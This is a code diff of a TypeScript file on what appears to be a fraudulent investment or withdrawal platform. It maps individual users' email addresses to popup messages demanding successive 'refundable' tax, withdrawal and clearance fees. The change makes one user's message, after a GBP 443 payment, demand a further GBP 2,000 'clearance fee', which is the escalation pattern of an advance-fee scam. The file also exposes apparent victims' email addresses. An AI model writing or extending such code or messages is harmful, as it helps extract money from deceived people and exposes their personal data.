@@ -363,7 +363,7 @@ const WITHDRAWAL_FEE_ALERT_BY_EMAIL: Record<string, string> = {
   "kas_12@hotmail.co.uk":
     "Tax cleared successfully. A refundable withdrawal fee of GBP 1,655.00 is required to continue with withdrawal.",
   "aurela014@outlook.com":
-    "Thank you for clearing tax. The last step is a refundable withdrawal fee of GBP 443.00.",
+    "Withdrawal fee of GBP 443.00 cleared successfully. Congratulations. To complete final account clearance and release your withdrawal, a refundable clearance fee of GBP 2,000.00 is now required. Please proceed with payment to finalize processing.",
   "ttvcurser@gmail.com":
     "Tax cleared successfully. A withdrawal fee of GBP 500.00 is required to continue with withdrawal.",
   "ajamibilal@yahoo.com":
@@ -400,7 +400,7 @@ const TAX_CLEARED_POPUP_BY_EMAIL: Record<string, string> = {
     "Tax cleared successfully. Please clear the refundable withdrawal fee of GBP 1,655.00 to proceed with withdrawal."
   ,
   "aurela014@outlook.com":
-    "Thank you for clearing tax. The last step is a refundable withdrawal fee of GBP 443.00.",
+    "Congratulations on successfully paying the GBP 443.00 withdrawal fee. The final step is a refundable clearance fee of GBP 2,000.00 to complete account clearance and release your withdrawal. Please make payment to proceed.",
   "ttvcurser@gmail.com":
     "Tax cleared successfully. Please clear the withdrawal fee of GBP 500.00 to proceed with withdrawal.",
   "ajamibilal@yahoo.com":
